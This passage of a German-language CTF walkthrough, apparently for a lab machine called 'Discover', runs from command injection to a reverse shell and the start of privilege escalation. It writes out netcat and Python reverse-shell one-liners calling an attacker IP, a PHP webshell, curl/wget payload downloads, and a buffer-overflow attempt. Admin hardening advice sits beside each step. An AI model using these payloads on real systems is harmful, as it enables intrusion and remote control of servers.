+            *   `date`: Zeigt das aktuelle Datum und die Uhrzeit des Servers an.
+            *   `ping 192.168.2.140`: Sendet ICMP-Pakete an unsere Angreifer-Maschine (angenommene IP). Dies testet die Netzwerkkonnektivität vom Zielsystem zu uns.
+            *   `ls -lart;pwd`: Listet Dateien detailliert auf und gibt das aktuelle Arbeitsverzeichnis aus (`/var/www/html/botdiscover`). Das Semikolon erlaubt die Verkettung von Befehlen.</p>
+            <p class="evaluation">**Bewertung:** Wir bestätigen, dass wir Befehle als Benutzer `www-data` ausführen können und das Arbeitsverzeichnis `/var/www/html/botdiscover` ist. Die Konnektivität zu unserer Maschine ist gegeben (angenommen, der Ping kam an), was für eine Reverse Shell wichtig ist.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Den Quellcode der `index.php` untersuchen, um die Schwachstelle besser zu verstehen und eventuell Passwörter oder weitere Hinweise zu finden. Eine Reverse Shell aufbauen.
+            **Empfehlung (Admin):** Dringend die Command Injection beheben. Den Webserver nicht als `root` laufen lassen (hier `www-data`, was gut ist). Berechtigungen im Web-Verzeichnis überprüfen.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt"># <span class="command">Manuelle Tests im Browser (Quellcode-Anzeige)</span></div>
+                    <pre>
+# Aufruf: view-source:http://log.discover.hmv/index.php?username=cat%20/var/www/html/botdiscover/index.php
+# Ausgabe im Browser (Auszug relevant für PHP):
+    <?php
+    if(isset($GET["username"])){
+      echo shell_exec($GET["username"]);
+      if($GET["username"] == "Discover" && $GET["password"] == "ufoundmypassword") 
+        echo "WELLDONE";
+    }
+#
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis">**Analyse:** Wir nutzen die Command Injection, um den Quellcode der `index.php`-Datei selbst anzuzeigen (`cat /var/www/html/botdiscover/index.php`). Der entscheidende Teil ist:
+            *   `if(isset($GET["username"]))`: Prüft, ob der Parameter `username` übergeben wurde.
+            *   `echo shell_exec($GET["username"]);`: Führt den Wert des `username`-Parameters direkt als Shell-Befehl aus und gibt das Ergebnis aus. **Dies ist die kritische Schwachstelle.**
+            *   `if($GET["username"] == "Discover" && $GET["password"] == "ufoundmypassword")`: Es gibt eine zusätzliche Bedingung. Wenn der `username` "Discover" und das `password` "<span class="password">ufoundmypassword</span>" ist, wird "WELLDONE" ausgegeben. Dies enthüllt ein Passwort!</p>
+            <p class="evaluation">**Bewertung:** Der Quellcode bestätigt nicht nur die `shell_exec`-Schwachstelle, sondern liefert uns auch ein Passwort: `<span class="password">ufoundmypassword</span>` für den Benutzernamen "Discover". Dies ist ein enorm wichtiger Fund, der möglicherweise für spätere Phasen (Privilege Escalation) nützlich ist.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Das gefundene Passwort `<span class="password">ufoundmypassword</span>` und den Benutzernamen "Discover" notieren. Ausprobieren, ob dieses Passwort auch für andere Dienste oder Benutzer gilt (z.B. SSH, sudo). Die Command Injection weiter nutzen, um eine Reverse Shell zu erhalten.
+            **Empfehlung (Admin):** **Schwachstelle sofort beheben!** Passwörter niemals im Quellcode speichern. Die `shell_exec`-Funktion sicher kapseln oder ersetzen. Sichere Authentifizierungsmethoden verwenden.</p>
+ 
+             <p class="comment">Der Originalbericht erwähnt hier eine manuelle Modifikation des HTML-Formulars (Änderung von GET zu POST, Aktivierung des Submit-Buttons) und einen Login-Versuch. Da wir die RCE bereits nutzen, sind diese Schritte nicht zwingend notwendig, aber die Validierung der gefundenen Zugangsdaten ist sinnvoll.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt"># <span class="command">Manuelle Tests im Browser (Verwendung des gefundenen Passworts)</span></div>
+                    <pre>
+# Annahme: Manuelle Modifikation des HTML-Codes, um POST statt GET zu verwenden und Submit zu ermöglichen.
+# Eingabe im modifizierten Formular:
+Username: Discover
+Password: <span class="password">ufoundmypassword</span>
+# Ausgabe nach Submit:
+WELLDONE
+
+# Testen der RCE mit dem Passwort:
+# Aufruf: http://log.discover.hmv/index.php?username=ls&password=ufoundmypassword
+# Ausgabe im Browser:
+index.php
+WELLDONE
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis">**Analyse:** Wir bestätigen, dass die Kombination `username=Discover` und `password=ufoundmypassword` tatsächlich zur Ausgabe "WELLDONE" führt. Die RCE funktioniert auch, wenn wir das korrekte Passwort angeben.</p>
+            <p class="evaluation">**Bewertung:** Die Zugangsdaten sind korrekt und die RCE bleibt bestehen. Dies gibt uns Flexibilität bei der Ausnutzung.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Fokus auf die Erlangung einer Reverse Shell legen, da dies einen stabileren Zugriff ermöglicht als URL-basierte Command Injection.
+            **Empfehlung (Admin):** Schwachstelle beheben.</p>
+
+            <p class="comment">Wir versuchen nun, eine Reverse Shell über die Command Injection aufzubauen. Dazu testen wir verschiedene Methoden.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt"># <span class="command">Manuelle Tests im Browser (Versuche, eine Shell zu etablieren)</span></div>
+                    <pre>
+# Versuch 1: Python One-Liner (Teil 1, unvollständig im Originaltext)
+# http://log.discover.hmv/index.php?username=python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.2.140",9001));os'&password=ufoundmypassword
+# (Hinweis: Der Python-Befehl ist unvollständig und würde so nicht funktionieren. Vermutlich fehlten Teile zum Umleiten der Standard-Streams.)
+
+# Versuch 2: Netcat Reverse Shell mit FIFO-Pipe
+# http://log.discover.hmv/index.php?username=rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.2.140 9001 >/tmp/f&password=ufoundmypassword
+# (Hinweis: Dieser Befehl versucht, eine interaktive Shell über Netcat aufzubauen.)
+
+# Testen der Schreibrechte in /dev/shm (Shared Memory, oft beschreibbar)
+# http://log.discover.hmv/index.php?username=echo "hallo" > /dev/shm/ben.txt&password=ufoundmypassword
+# http://log.discover.hmv/index.php?username=ls%20/dev/shm/ben.txt&password=ufoundmypassword
+# Ausgabe: /dev/shm/ben.txt
+# http://log.discover.hmv/index.php?username=cat%20/dev/shm/ben.txt&password=ufoundmypassword
+# Ausgabe: hallo
+
+# Erstellen einer einfachen PHP-Webshell in /dev/shm
+# http://log.discover.hmv/index.php?username=echo "<?php system($_REQUEST['cmd']);?>" > /dev/shm/ben.php&password=ufoundmypassword
+# http://log.discover.hmv/index.php?username=ls%20%20/dev/shm/&password=ufoundmypassword
+# Ausgabe: ben.php ben.txt
+# http://log.discover.hmv/index.php?username=cat /dev/shm/ben.php&password=ufoundmypassword
+# Ausgabe: <?php system($_REQUEST['cmd']);?>
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis">**Analyse:** Wir probieren verschiedene Ansätze für eine Reverse Shell. Die Python- und Netcat-One-Liner sind gängige Methoden, die hier aber möglicherweise aufgrund von Zeichenbeschränkungen in der URL oder fehlenden Tools auf dem Zielsystem nicht direkt funktionieren.
+            Wir stellen fest, dass das Verzeichnis `/dev/shm` (ein temporäres Dateisystem im RAM) für den `www-data`-Benutzer beschreibbar ist. Dies ist ein wichtiger Fund, da wir hier Dateien ablegen können.
+            Wir nutzen dies, um eine einfache PHP-Webshell (`ben.php`) zu erstellen. Diese Webshell nimmt einen Befehl über den `cmd`-Parameter entgegen und führt ihn aus.</p>
+            <p class="evaluation">**Bewertung:** Das beschreibbare Verzeichnis `/dev/shm` ist sehr nützlich. Die erstellte Webshell (`ben.php`) bietet eine alternative Methode zur Befehlsausführung, die möglicherweise stabiler ist oder weniger Probleme mit Sonderzeichen in der URL hat. Sie ist jedoch noch keine interaktive Shell.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Die PHP-Webshell als Zwischenschritt nutzen, um komplexere Befehle auszuführen, z.B. das Herunterladen eines dedizierten Reverse-Shell-Skripts von unserer Angreifer-Maschine. `/dev/shm` als Ablageort verwenden.
+            **Empfehlung (Admin):** Schreibrechte in temporären Verzeichnissen wie `/dev/shm` oder `/tmp` einschränken, wo immer möglich (Noexec-Mount-Optionen prüfen). Die RCE-Schwachstelle bleibt das Hauptproblem.</p>
+
+            <p class="comment">Wir bereiten das Herunterladen eines Reverse-Shell-Skripts vor, indem wir auf unserer Angreifer-Maschine einen einfachen HTTP-Server starten.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">python3 -m http.server 80</span></div>
+                    <pre>
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+                    </pre>
+                </div>
+            </div>
+             <p class="analysis">**Analyse:** Auf unserer Kali/Cyber-Maschine starten wir mit Python einen simplen Webserver auf Port 80. Dieser dient dazu, Dateien (wie unser Reverse-Shell-Skript) für das Zielsystem zum Download bereitzustellen.</p>
+             <p class="evaluation">**Bewertung:** Standardvorgehen, um Dateien auf ein Zielsystem zu übertragen, wenn ausgehende Verbindungen vom Ziel erlaubt sind.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Sicherstellen, dass das benötigte Reverse-Shell-Skript im Verzeichnis liegt, aus dem der Python-Server gestartet wurde. Firewall auf der Angreifer-Maschine prüfen, um eingehende Verbindungen auf Port 80 zuzulassen.
+            **Empfehlung (Admin):** Ausgehenden HTTP/HTTPS-Verkehr vom Server nur zu erlaubten Zielen zulassen (Proxy, Firewall-Regeln).</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt"># <span class="command">Manuelle Tests im Browser (Download-Versuche über RCE)</span></div>
+                    <pre>
+# Aufruf: http://log.discover.hmv/index.php?username=wget%20http://192.168.2.140/ben.php&password=...
+# (Hinweis: Lädt die zuvor erstellte Webshell erneut herunter, ggf. Test)
+
+# Aufruf: http://log.discover.hmv/index.php?username=find%20/%20-name%20ben.php&password=...
+# Ausgabe: /dev/shm/ben.php
+
+# Aufruf: http://log.discover.hmv/index.php?username=curl%20-o%20/dev/shm/ben2.php%20http://192.168.2.140/rev.php&password=...
+# (Hinweis: Versucht, eine Datei namens 'rev.php' von unserem Server herunterzuladen und als 'ben2.php' in /dev/shm zu speichern. Der Inhalt von rev.php ist nicht gezeigt, aber es ist wahrscheinlich ein PHP-Reverse-Shell-Skript.)
+
+# Aufruf: http://log.discover.hmv/index.php?username=ls%20/dev/shm&password=...
+# Ausgabe: ben.php ben.txt ben2.php
+                    </pre>
+                 </div>
+                 <div class="terminal">
+                    <div class="prompt"># <span class="command">Python HTTP Server Log (auf Angreifer-Maschine)</span></div>
+                    <pre>
+192.168.2.112 - - [30/Sep/2022 00:56:38] "GET /ben.php HTTP/1.1" 200 -
+# (Bestätigt den Download von ben.php durch das Zielsystem)
+# Annahme: Ein ähnlicher Logeintrag für rev.php/ben2.php würde erscheinen.
+                    </pre>
+                 </div>
+            </div>
+            <p class="analysis">**Analyse:** Wir nutzen die RCE-Schwachstelle nun, um mittels `wget` oder `curl` Dateien von unserem Python-HTTP-Server (192.168.2.140) auf das Zielsystem in das beschreibbare Verzeichnis `/dev/shm` herunterzuladen. Wir laden hier eine Datei `rev.php` (vermutlich ein PHP-Reverse-Shell-Payload) herunter und speichern sie als `ben2.php`. Die `ls`-Ausgabe bestätigt, dass die Datei erfolgreich im `/dev/shm`-Verzeichnis abgelegt wurde.</p>
+            <p class="evaluation">**Bewertung:** Der Dateitransfer war erfolgreich. Wir haben nun ein dediziertes Reverse-Shell-Skript auf dem Zielsystem platziert, was die Chancen auf eine stabile interaktive Shell erhöht.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Das heruntergeladene Skript (`ben2.php` bzw. `rev.php`) ausführbar machen (falls nötig) und ausführen, während auf der Angreifer-Maschine ein Listener (Netcat) auf dem entsprechenden Port läuft.
+            **Empfehlung (Admin):** RCE beheben. Ausgehenden Traffic überwachen und einschränken. Tools wie `wget` und `curl` auf Produktivsystemen nur installieren, wenn unbedingt nötig.</p>
+
+            <p class="comment">Wir starten den Listener auf unserer Angreifer-Maschine, um die eingehende Verbindung der Reverse Shell abzufangen.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nc -lvnp 9001</span></div>
+                    <pre>
+listening on [any] 9001 ...
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis">**Analyse:** Wir verwenden `nc` (Netcat), um auf unserer Maschine auf TCP-Port 9001 auf eingehende Verbindungen zu warten.
+            *   `-l`: Listen-Modus.
+            *   `-v`: Verbose-Modus (mehr Ausgabe).
+            *   `-n`: Keine DNS-Auflösung.
+            *   `-p`: Port angeben.</p>
+            <p class="evaluation">**Bewertung:** Der Listener ist bereit, die Verbindung von der Reverse Shell entgegenzunehmen.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Sicherstellen, dass die Firewall auf der Angreifer-Maschine eingehende Verbindungen auf Port 9001 erlaubt. Den Port im Reverse-Shell-Skript (`rev.php`) korrekt konfigurieren.
+            **Empfehlung (Admin):** Netzwerk-Monitoring auf ungewöhnliche ausgehende Verbindungen zu hohen Ports oder bekannten Angreifer-IPs.</p>
+
+            <p class="comment">Wir lösen die Reverse Shell vom Zielsystem aus, indem wir das heruntergeladene PHP-Skript über die RCE-Schwachstelle ausführen.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt"># <span class="command">Manuelle Tests im Browser (Reverse Shell Ausführung)</span></div>
+                    <pre>
+# Umbenennung/Neuer Download zu rev.php (Konsistenz)
+# http://log.discover.hmv/index.php?username=curl -o /dev/shm/rev.php http://192.168.2.140/rev.php&password=...
+
+# Berechtigungen anpassen (oft notwendig für Ausführung)
+# http://log.discover.hmv/index.php?username=chmod 777 /dev/shm/rev.php&password=...
+
+# Ausführen des PHP-Reverse-Shell-Skripts
+# http://log.discover.hmv/index.php?username=php /dev/shm/rev.php&password=...
+# (Alternative: pwd | php /dev/shm/rev.php - 'pwd' wird hier ignoriert, nur php wird ausgeführt)
+                    </pre>
+                </div>
+            </div>
+             <p class="analysis">**Analyse:** Wir führen mehrere Befehle über die RCE aus:
+            1.  Wir stellen sicher, dass das Reverse-Shell-Skript als `rev.php` in `/dev/shm` liegt (erneuter Download oder Umbenennung).
+            2.  Wir ändern die Berechtigungen der Datei auf 777 (`chmod 777`), um sicherzustellen, dass der `www-data`-Benutzer sie ausführen darf.
+            3.  Wir führen das Skript mit dem PHP-Interpreter aus (`php /dev/shm/rev.php`). Dieser Befehl sollte die Verbindung zu unserem Netcat-Listener auf Port 9001 herstellen.</p>
+            <p class="evaluation">**Bewertung:** Dies sind die entscheidenden Schritte, um die Reverse Shell zu aktivieren.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Den Netcat-Listener beobachten. Wenn keine Verbindung zustande kommt, Fehler prüfen: Firewall? Falsche IP/Port im Skript? Fehlender PHP-Interpreter? Falsche Berechtigungen?
+            **Empfehlung (Admin):** RCE beheben. Ausführung von Skripten in `/dev/shm` verhindern (noexec). PHP-Interpreter nur verfügbar machen, wenn nötig.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nc -lvnp 9001</span></div>
+                    <pre>
+listening on [any] 9001 ...
+connect to [192.168.2.140] from (UNKNOWN) [192.168.2.112] 46456
+Linux debian 5.10.0-17-amd64 #1 SMP Debian 5.10.136-1 (2022-08-13) x86_64 GNU/Linux
+ 19:22:45 up  3:06,  0 users,  load average: 0.02, 0.02, 0.07
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+/bin/sh: 0: can't access tty; job control turned off
+$
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis">**Analyse:** Unser Netcat-Listener meldet eine eingehende Verbindung von der Ziel-IP 192.168.2.112. Wir sehen grundlegende Systeminformationen (Kernel-Version, Uptime, Load) und die Ausgabe des `id`-Befehls (`uid=33(www-data)`). Wir haben nun eine Shell-Eingabeaufforderung (`$`). Die Meldung `/bin/sh: 0: can't access tty; job control turned off` zeigt, dass es sich um eine einfache, nicht-interaktive Shell handelt.</p>
+            <p class="evaluation">**Bewertung:** Fantastisch! Der initiale Zugriff war erfolgreich. Wir haben eine Reverse Shell und können nun Befehle direkt auf dem Zielsystem als Benutzer `www-data` ausführen. Dies markiert den Abschluss der Initial-Access-Phase.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Die Shell sofort stabilisieren und interaktiv machen (z.B. mit Python pty). Die Umgebung erkunden (`whoami`, `pwd`, `ls -la`, `ip a`, `ps aux`). Nach Möglichkeiten zur Privilege Escalation suchen.
+            **Empfehlung (Admin):** Sicherheitsvorfall! Die Kompromittierung untersuchen. Die RCE-Schwachstelle identifizieren und beheben. Nach Persistenzmechanismen suchen, die der Angreifer möglicherweise hinterlassen hat. System neu aufsetzen oder aus einem sauberen Backup wiederherstellen, wenn eine vollständige Bereinigung nicht garantiert werden kann.</p>
+
+            <p class="comment">Wir stabilisieren die erhaltene Shell, um sie interaktiver zu machen.</p>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">$ <span class="command">python3 -c 'import pty; pty.spawn("/bin/bash")'</span></div>
+                    <!-- Keine direkte Ausgabe, aber der Prompt ändert sich und die Shell wird interaktiver -->
+                    <div class="prompt">www-data@debian:/home/discover$ <span class="command">export TERM=xterm</span></div>
+                     <!-- Keine Ausgabe -->
+                    <div class="prompt">www-data@debian:/home/discover$ <!-- Nun haben wir eine bessere Bash-Shell --></div>
+
+                </div>
+            </div>
+            <p class="analysis">**Analyse:**
+            1.  `python3 -c 'import pty; pty.spawn("/bin/bash")'`: Wir nutzen Python 3 (falls vorhanden), um eine Pseudo-Terminal (pty) Sitzung zu starten und eine Bash-Shell darin auszuführen. Dies behebt viele Probleme einfacher Shells (z.B. fehlende Job-Kontrolle, Probleme mit Programmen wie `sudo` oder `su`).
+            2.  `export TERM=xterm`: Wir setzen die Terminal-Umgebungsvariable, damit Programme wie `clear` oder Editoren wie `vim`/`nano` korrekt funktionieren.
+            Der Prompt ändert sich zu `www-data@debian:/home/discover$`, was eine typische Bash-Anzeige ist.</p>
+            <p class="evaluation">**Bewertung:** Die Shell-Stabilisierung ist ein wichtiger Schritt für eine effiziente Post-Exploitation. Wir haben jetzt eine deutlich benutzerfreundlichere und funktionalere Shell.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Mit der stabilisierten Shell weiterarbeiten. System enumerieren, nach Sudo-Rechten, SUID-Dateien, Cronjobs, Kernel-Exploits etc. suchen.
+            **Empfehlung (Admin):** Die Präsenz von Python auf einem Webserver kann das Risiko erhöhen, da es oft für solche Stabilisierungs-Tricks verwendet wird. Nur notwendige Software installieren.</p>
+        </section>
+
+        <section id="privilege-escalation">
+            <h2>Privilege Escalation (www-data zu discover)</h2>
+            <p class="comment">Nachdem wir als `www-data` Fuß gefasst haben, suchen wir nach Wegen, unsere Rechte auf dem System zu erhöhen. Unser erstes Ziel ist es, zum Benutzer `discover` zu wechseln, da wir dessen Passwort im Quellcode gefunden haben und er möglicherweise mehr Rechte hat.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">www-data@debian:/home/discover$ <span class="command">cat User.txt</span></div>
+                    <pre>
+cat: User.txt: Permission denied
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis">**Analyse:** Wir versuchen, die Datei `User.txt` im Home-Verzeichnis von `discover` zu lesen. Dies schlägt fehl (`Permission denied`), was zeigt, dass wir als `www-data` nicht die nötigen Rechte haben.</p>
+            <p class="evaluation">**Bewertung:** Bestätigt die Notwendigkeit der Rechteerweiterung, um die User-Flag zu lesen.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Nach Möglichkeiten suchen, zum Benutzer `discover` zu wechseln oder dessen Rechte zu erlangen (z.B. `su discover`, `sudo -u discover ...`).
+            **Empfehlung (Admin):** Dateiberechtigungen überprüfen. Home-Verzeichnisse sollten nur für den jeweiligen Benutzer und Root lesbar/schreibbar sein.</p>
+
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">www-data@debian:/home/discover$ <span class="command">sudo -l</span></div>
+                    <pre>
+Matching Defaults entries for www-data on debian:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User www-data may run the following commands on debian:
+    (discover) NOPASSWD: /opt/overflow
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis">**Analyse:** Wir führen `sudo -l` aus, um zu prüfen, welche Befehle der Benutzer `www-data` mit `sudo` (also mit den Rechten anderer Benutzer) ausführen darf. Das Ergebnis ist sehr interessant: `www-data` darf das Programm `/opt/overflow` als Benutzer `discover` ohne Passwortabfrage (`NOPASSWD`) ausführen.</p>
+            <p class="evaluation">**Bewertung:** Dies ist ein klarer Weg zur Privilege Escalation zum Benutzer `discover`. Wenn wir das Programm `/opt/overflow` dazu bringen können, eine Shell zu starten oder beliebigen Code als `discover` auszuführen, haben wir unser Zwischenziel erreicht.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Das Programm `/opt/overflow` genauer untersuchen. Herausfinden, was es tut und ob es für einen Exploit anfällig ist (z.B. Buffer Overflow, Command Injection, etc.).
+            **Empfehlung (Admin):** `sudo`-Rechte sehr restriktiv vergeben. `NOPASSWD` nur in absolut notwendigen Fällen verwenden. Programme, die über `sudo` ausgeführt werden können, sorgfältig prüfen und härten. `secure_path` ist eine gute Sicherheitseinstellung, die hier vorhanden ist.</p>
+
+             <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt">www-data@debian:/home/discover$ <span class="command">file /opt/overflow</span></div>
+                    <pre>
+/opt/overflow: executable, regular file, no read permission
+                    </pre>
+                     <div class="prompt">www-data@debian:/home/discover$ <span class="command">ls -la /opt/overflow</span></div>
+                    <pre>
+-rwx--x--x 1 root root 8831 Aug 30 14:34 /opt/overflow
+                    </pre>
+                </div>
+            </div>
+             <p class="analysis">**Analyse:** Wir untersuchen die Datei `/opt/overflow`:
+            *   `file`: Zeigt, dass es sich um eine ausführbare Datei handelt. Wir haben keine Leseberechtigung (`no read permission`).
+            *   `ls -la`: Zeigt die detaillierten Berechtigungen:
+                *   Besitzer: `root`, Gruppe: `root`.
+                *   Berechtigungen: `-rwx--x--x`. Der Besitzer (`root`) hat Lese-, Schreib- und Ausführrechte (`rwx`). Die Gruppe (`root`) hat nur Ausführrechte (`--x`). Alle anderen (`other`, einschließlich `www-data` und `discover`) haben ebenfalls nur Ausführrechte (`--x`).
+            Wichtig: Obwohl `www-data` die Datei nicht lesen kann, kann `www-data` sie über `sudo -u discover` ausführen, und zwar *mit den Rechten von discover*. Discover selbst hat auch nur Ausführrechte.</p>
+             <p class="evaluation">**Bewertung:** Dass wir die Datei nicht lesen können, erschwert die Analyse (kein Reverse Engineering durch uns als `www-data`). Da sie aber ausführbar ist und über `sudo` genutzt werden kann, deutet der Name "overflow" stark auf eine beabsichtigte Buffer-Overflow-Schwachstelle hin.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Da wir den Code nicht sehen können, müssen wir Blackbox-Testing durchführen. Versuchen, das Programm mit verschiedenen Eingaben (insbesondere langen Strings) über `sudo -u discover` auszuführen und auf Abstürze (Segfaults) oder unerwartetes Verhalten zu achten. Das deutet auf einen Buffer Overflow hin.
+            **Empfehlung (Admin):** Ausführbare Dateien, die über `sudo` genutzt werden, sollten idealerweise auch für den ausführenden Benutzer lesbar sein, um Transparenz zu ermöglichen (widerspricht hier aber ggf. dem CTF-Design). Die Berechtigungen sind hier jedoch so gesetzt, dass nur Ausführung möglich ist.</p>
+
+             <p class="comment">Wir suchen nach weiteren Wegen zur Rechteerweiterung, falls der `sudo`-Weg nicht direkt funktioniert, z.B. durch SUID-Dateien.</p>
+            <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt">www-data@debian:/var/log$ <span class="command">find / -type f -perm -4000 -ls 2>/dev/null</span></div>
+                    <pre>
+    13705     20 -rwsr-xr-x   1 root     root        19040 Jan 13  2022 /usr/libexec/polkit-agent-helper-1
+   131394     52 -rwsr-xr--   1 root     messagebus    51336 Feb 21  2021 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
+   267318    472 -rwsr-xr-x   1 root     root         481608 Jul  1 18:37 /usr/lib/openssh/ssh-keysign
+      109     88 -rwsr-xr-x   1 root     root          88304 Feb  7  2020 /usr/bin/gpasswd
+     4315    180 -rwsr-xr-x   1 root     root         182600 Feb 27  2021 /usr/bin/sudo
+      106     60 -rwsr-xr-x   1 root     root          58416 Feb  7  2020 /usr/bin/chfn
+      107     52 -rwsr-xr-x   1 root     root          52880 Feb  7  2020 /usr/bin/chsh
+     4132     36 -rwsr-xr-x   1 root     root          35040 Jan 20  2022 /usr/bin/umount
+     3763     72 -rwsr-xr-x   1 root     root          71912 Jan 20  2022 /usr/bin/su
+    13703     24 -rwsr-xr-x   1 root     root          23448 Jan 13  2022 /usr/bin/pkexec
+      110     64 -rwsr-xr-x   1 root     root          63960 Feb  7  2020 /usr/bin/passwd
+     3604     44 -rwsr-xr-x   1 root     root          44632 Feb  7  2020 /usr/bin/newgrp
+     4130     56 -rwsr-xr-x   1 root     root          55528 Jan 20  2022 /usr/bin/mount
+                    </pre>
+                </div>
+            </div>
+             <p class="analysis">**Analyse:** Wir suchen im gesamten Dateisystem (`/`) nach Dateien (`-type f`), die das SUID-Bit gesetzt haben (`-perm -4000`). Das SUID-Bit bewirkt, dass ein Programm immer mit den Rechten des Dateibesitzers (hier meist `root`) ausgeführt wird, egal wer es startet. `2>/dev/null` unterdrückt Fehlermeldungen (z.B. bei Zugriff auf nicht lesbare Verzeichnisse).
+            Die Ausgabe zeigt die üblichen Verdächtigen (`sudo`, `su`, `passwd`, `pkexec` etc.), aber keine ungewöhnlichen oder benutzerdefinierten SUID-Dateien, die direkt für einen Exploit missbraucht werden könnten (abgesehen von bekannten Schwachstellen in diesen Standard-Tools, z.B. ältere `pkexec`-Versionen - Polkit).</p>
+             <p class="evaluation">**Bewertung:** Die Suche nach SUID-Dateien hat hier keinen einfachen, alternativen Weg zur Rechteerweiterung aufgedeckt. Wir müssen uns auf den `sudo`-Eintrag für `/opt/overflow` konzentrieren.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Versionen der gefundenen SUID-Binaries prüfen (z.B. `pkexec --version`) und auf bekannte Exploits (wie PwnKit für Polkit/pkexec) testen. Fokus bleibt aber auf `/opt/overflow`.
+            **Empfehlung (Admin):** Regelmäßig überprüfen, ob unnötige SUID-Bits gesetzt sind. Software aktuell halten, um bekannte SUID-Exploits zu mitigieren.</p>
+
+            <p class="comment">Wir konzentrieren uns auf den Buffer Overflow in `/opt/overflow`. Wir finden eine "hint"-Datei und versuchen, den Exploit damit zu konstruieren.</p>
+
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">www-data@debian:/$ <span class="command"># Shell Stabilisierung (bereits oben erfolgt, hier nur Kontext)</span></div>
+                    <div class="prompt">www-data@debian:/$ <span class="command">export TERM=xterm</span></div>
+                    <div class="prompt">www-data@debian:/$ <span class="command">clear</span></div>
+                    <!-- Ausgabe: Terminal wird geleert -->
+                    <div class="prompt">www-data@debian:/opt$ <span class="command">cat hint</span></div>
+                    <pre>
+AAAAAAAAAAAAAAAAAAAAAAAA"+"\x5d\x06\x40\x00
+                    </pre>
+                    <div class="prompt">www-data@debian:/opt$ <span class="command">sudo -u discover /opt/overflow $(echo -n "AAAAAAAAAAAAAAAAAAAAAAAA"+"\x5d\x06\x40\x00")</span></div>
+                    <pre>
+Segmentation fault
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis">**Analyse:** Im `/opt`-Verzeichnis finden wir eine Datei namens `hint`. Der Inhalt `AAAAAAAAAAAAAAAAAAAAAAAA"+"\x5d\x06\x40\x00` sieht wie ein Teil eines Buffer-Overflow-Exploits aus:
+            *   `AAAAAAAAAAAAAAAAAAAAAAAA`: Eine Folge von 'A'-Zeichen (24 Stück), die wahrscheinlich den Puffer füllen (Padding).
+            *   `\x5d\x06\x40\x00`: Dies sieht wie eine Speicheradresse (Little Endian: `0x0040065d`) aus, die wahrscheinlich die Rücksprungadresse (Return Address) auf dem Stack überschreiben soll. Diese Adresse zeigt vermutlich auf eine Funktion oder Code-Stelle, die wir ausführen wollen (z.B. eine Funktion, die eine Shell startet oder die User-Flag ausgibt).
+            Wir versuchen, diesen String als Argument an `/opt/overflow` zu übergeben, ausgeführt als `discover` mittels `sudo`. Das `$(echo -n ...)` stellt sicher, dass die Escape-Sequenzen (`\x`) korrekt interpretiert werden.
+            Das Programm stürzt mit einem `Segmentation fault` ab. Das bedeutet, wir haben den Speicher erfolgreich manipuliert (wahrscheinlich die Rücksprungadresse überschrieben), aber die Adresse `0x0040065d` führt nicht zu gültigem Code oder verursacht einen Fehler beim Zugriff.</p>
+            <p class="evaluation">**Bewertung:** Der `Segmentation fault` ist ein gutes Zeichen! Er bestätigt die Buffer-Overflow-Anfälligkeit und dass wir die Kontrolle über die Rücksprungadresse erlangt haben. Die Adresse aus der `hint`-Datei ist jedoch nicht die korrekte für unser Ziel (z.B. eine Shell). Wir müssen die korrekte Adresse finden oder den Exploit anpassen.</p>
